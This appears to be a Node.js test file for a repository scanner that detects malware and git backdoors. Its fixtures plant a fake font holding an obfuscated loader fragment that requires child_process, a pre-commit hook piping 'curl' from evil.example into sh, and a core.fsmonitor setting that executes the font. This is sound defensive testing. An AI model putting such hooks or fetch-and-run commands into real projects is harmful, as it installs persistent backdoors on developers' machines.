const { describe, it } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');
const { scanProject, findProjects, gitPersistenceFindings } = require('../src/advancedScanner');

const MARK = 'glo' + "bal['!']";
const FAKE_FONT = MARK + "='9-0777-1';(function(_0xda4c00,_0x229911){var _0x35893f=_0x490c;" +
  "while(!![]){try{var _0x50e4cd=parseInt(_0x35893f(0x21f));}catch(_0x25b35f){}}}(_0xcc75,0x1));var cp=require('child_process');";

function repo(dir) {
  fs.mkdirSync(dir, { recursive: true });
  execFileSync('git', ['init', '-q'], { cwd: dir });
  return dir;
}

describe('Advanced Scanner', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'gitsafty-adv-'));
  const clean = repo(path.join(root, 'clean-app'));
  fs.writeFileSync(path.join(clean, 'index.js'), 'module.exports = 1;\n');
  fs.mkdirSync(path.join(clean, 'node_modules/pkg'), { recursive: true });
  fs.writeFileSync(path.join(clean, 'node_modules/pkg/tool.dll'), 'MZ');
  fs.writeFileSync(path.join(clean, '.gitignore'), 'node_modules\n.env\n');
  fs.writeFileSync(path.join(clean, '.env'), 'API_KEY=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n');

  const infected = repo(path.join(root, 'infected-app'));
  fs.mkdirSync(path.join(infected, 'fonts'));
  fs.writeFileSync(path.join(infected, 'fonts/fa.woff2'), FAKE_FONT);
  fs.writeFileSync(path.join(infected, '.git/hooks/pre-commit'), '#!/bin/sh\ncurl -s https://evil.example/x | sh\n', { mode: 0o755 });
  execFileSync('git', ['config', 'core.fsmonitor', 'node fonts/fa.woff2'], { cwd: infected });

  const plain = path.join(root, 'plain-folder');
  fs.mkdirSync(plain);
  fs.writeFileSync(path.join(plain, 'notes.txt'), 'hello');

  it('finds every project folder, git or not', () => {
    const names = findProjects(root).map(p => path.basename(p)).sort();
    assert.deepStrictEqual(names, ['clean-app', 'infected-app', 'plain-folder']);
  });

  it('reports nothing for a clean project (ignores node_modules and ignored .env)', () => {
    const r = scanProject(clean);
    assert.deepStrictEqual(r.findings, []);
  });

  it('finds malware and git backdoors in an infected project', () => {
    const r = scanProject(infected);
    assert.ok(r.summary.malware >= 1);
    const backdoors = gitPersistenceFindings(infected).map(f => f.name);
    assert.ok(backdoors.some(n => /\.git\/hooks\/pre-commit/.test(n)));
    assert.ok(backdoors.some(n => /core\.fsmonitor/.test(n)));
  });

  it('cleans up', () => {
    fs.rmSync(root, { recursive: true, force: true });
  });
});
